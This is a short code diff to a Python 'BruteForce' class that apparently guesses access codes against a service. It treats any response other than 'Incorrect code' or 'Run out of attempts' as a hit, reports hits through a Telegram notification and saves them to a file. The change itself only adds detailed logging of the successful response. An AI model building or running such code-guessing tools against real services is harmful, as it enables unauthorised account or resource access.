@@ -76,6 +76,18 @@ class BruteForce:
                 if (not response.text.startswith("{\"mssg\":\"Incorrect code")
                         and not response.text.startswith("{\"mssg\":\"Run out of attempts")):
                     self.logger.info(f"{i}: {response.text} : {generateCode(i)}")
+                    self.logger.info(response)
+                    self.logger.info(response.__dict__)
+                    self.logger.info(response.is_redirect, response.links, response.cookies)
+                    self.logger.info(
+                        {
+                            "raw": response.raw,
+                            "Method": response.request.method,
+                            "Status Code": response.status_code,
+                            "Headers": dict(response.headers),
+                            "Body": response.text,
+                        }
+                    )
 
                     send_tg_found(self.log_name)
                     with open(f'result-{generateCode(i)}', 'wb') as f:
